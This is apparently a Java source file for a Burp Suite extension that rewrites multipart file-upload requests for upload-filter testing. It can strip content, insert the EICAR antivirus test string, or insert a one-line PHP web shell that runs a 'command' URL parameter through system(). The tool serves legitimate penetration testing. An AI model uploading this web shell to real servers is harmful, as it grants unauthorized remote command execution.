import burp.api.montoya.MontoyaApi;
import burp.api.montoya.core.ToolType;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;
import burp.api.montoya.ui.contextmenu.MessageEditorHttpRequestResponse;

import javax.swing.*;
import java.awt.*;
import java.util.ArrayList;
import java.util.List;

public class MyContextMenuItemsProvider implements ContextMenuItemsProvider
{

    private final MontoyaApi api;

    public MyContextMenuItemsProvider(MontoyaApi api)
    {
        this.api = api;
    }

    @Override
    public List<Component> provideMenuItems(ContextMenuEvent event)
    {
        if (event.isFromTool(ToolType.PROXY, ToolType.REPEATER))
        {
            List<Component> menuItemList = new ArrayList<>();

            JMenuItem eraseAllDisposition = new JMenuItem("Erase All Content-Disposition");
            JMenuItem eraseOnlyImageDisposition = new JMenuItem("Erase Only Images Content-Disposition");
            JMenuItem replaceToEicar = new JMenuItem("Replace Image Content-Disposition to EICAR file");
            JMenuItem replaceToWebshell = new JMenuItem("Replace Image Content-Disposition to PHP WebShell file");

            HttpRequestResponse requestResponse = event.messageEditorRequestResponse().isPresent() ? event.messageEditorRequestResponse().get().requestResponse() : event.selectedRequestResponses().get(0);

            String originalBody = requestResponse.request().body().toString();

            // api.logging().logToOutput("Request BODY is:\r\n" + originalBody);

            menuItemList.add(eraseAllDisposition);
            menuItemList.add(eraseOnlyImageDisposition);
            menuItemList.add(replaceToEicar);
            menuItemList.add(replaceToWebshell);

            // Use removeContentFromMultipartBody function to remove text between ALL content dispositions
            eraseAllDisposition.addActionListener(l -> {

                String modifiedBody = removeContentFromMultipartBody(originalBody);
                // api.logging().logToOutput("Modified BODY is:\r\n" + modifiedBody);

                MessageEditorHttpRequestResponse messageEditorHttpRequestResponse = event.messageEditorRequestResponse().get();
                messageEditorHttpRequestResponse.setRequest(messageEditorHttpRequestResponse.requestResponse().request().withBody(modifiedBody));
            });

            // Use removeContentFromMultipartBody function to remove text only between image content dispositions (image/*)
            eraseOnlyImageDisposition.addActionListener(l -> {

                String modifiedBody = removeImageContentFromMultipartBody(originalBody);
                // api.logging().logToOutput("Modified BODY is:\r\n" + modifiedBody);

                MessageEditorHttpRequestResponse messageEditorHttpRequestResponse = event.messageEditorRequestResponse().get();
                messageEditorHttpRequestResponse.setRequest(messageEditorHttpRequestResponse.requestResponse().request().withBody(modifiedBody));
            });

            // Replacing image content dispositions to EICAR file content
            replaceToEicar.addActionListener(l -> {

                String eicarBody = replaceImageContentWithCustomText(originalBody, "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-ANTIVIRUS-TEST-FILE-ALTERADO!$H+H*");

                MessageEditorHttpRequestResponse messageEditorHttpRequestResponse = event.messageEditorRequestResponse().get();
                messageEditorHttpRequestResponse.setRequest(messageEditorHttpRequestResponse.requestResponse().request().withBody(eicarBody));
            });

            // Replacing image content dispositions to PHP WebShell content
            replaceToWebshell.addActionListener(l -> {

                String webshellBody = replaceImageContentWithCustomText(originalBody, "<?php echo system($_GET['command']); ?>");

                MessageEditorHttpRequestResponse messageEditorHttpRequestResponse = event.messageEditorRequestResponse().get();
                messageEditorHttpRequestResponse.setRequest(messageEditorHttpRequestResponse.requestResponse().request().withBody(webshellBody));
            });

            return menuItemList;
        }

        return null;
    }

    public String removeContentFromMultipartBody(String requestBody) {

        // Get the boundary from the first line of the request body
        String boundary = requestBody.substring(0, requestBody.indexOf("\r\n"));
        String[] parts = requestBody.split(boundary);

        StringBuilder result = new StringBuilder();

        for (String part : parts) {
            if (part.trim().isEmpty()) {
                continue; // Skip empty parts
            }

            // Find the end of the headers (marked by the double CRLF sequence)
            int headerEndIndex = part.indexOf("\r\n\r\n");
            if (headerEndIndex != -1) {

                // Append only the headers and boundary, discard everything after the headers
                result.append(boundary).append(part, 0, headerEndIndex + 4).append("\r\n"); // +4 includes the CRLF after headers based on the header index
            }
        }

        // Append the final boundary to close the request body
        result.append(boundary).append("--\r\n");

        return result.toString();
    }

    // Function to remove only images Content Types
    public String removeImageContentFromMultipartBody(String requestBody) {

        String boundary = requestBody.substring(0, requestBody.indexOf("\r\n"));
        String[] parts = requestBody.split(boundary);

        StringBuilder result = new StringBuilder();

        for (String part : parts) {
            if (part.trim().isEmpty()) {
                continue;
            }

            int headerEndIndex = part.indexOf("\r\n\r\n");
            if (headerEndIndex != -1) {
                String headers = part.substring(0, headerEndIndex + 4); // Extract headers
                String contentTypeHeader = headers.toLowerCase();

                // Check if the headers indicate an image type
                if (contentTypeHeader.contains("content-type:") && contentTypeHeader.contains("image/")) {

                    result.append(boundary).append(headers).append("\r\n");
                } else {
                    // Keep the entire part if it's not an image
                    result.append(boundary).append(part);
                }
            }
        }

        result.append(boundary).append("--\r\n");

        return result.toString();
    }

    public String replaceImageContentWithCustomText(String requestBody, String replacementText) {

        String boundary = requestBody.substring(0, requestBody.indexOf("\r\n"));
        String[] parts = requestBody.split(boundary);

        StringBuilder result = new StringBuilder();

        for (String part : parts) {
            if (part.trim().isEmpty()) {
                continue;
            }

            int headerEndIndex = part.indexOf("\r\n\r\n");
            if (headerEndIndex != -1) {
                String headers = part.substring(0, headerEndIndex + 4); // Extract headers
                String contentTypeHeader = headers.toLowerCase();

                if (contentTypeHeader.contains("content-type:") && contentTypeHeader.contains("image/")) {

                    // Replace content after the headers with the specified replacement text
                    result.append(boundary).append(headers).append(replacementText).append("\r\n");
                } else {

                    result.append(boundary).append(part);
                }
            }
        }
        
        result.append(boundary).append("--\r\n");

        return result.toString();
    }

}